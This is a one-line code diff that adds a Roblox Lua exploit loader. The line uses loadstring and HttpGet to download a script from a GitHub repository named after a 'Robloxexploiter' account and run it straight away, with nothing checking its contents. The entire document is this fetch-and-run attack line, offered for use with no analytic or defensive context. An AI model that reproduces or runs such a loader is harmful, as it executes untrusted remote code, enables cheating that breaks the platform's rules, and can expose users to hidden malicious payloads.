@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/Genesisloader/main/Script.lua"))()
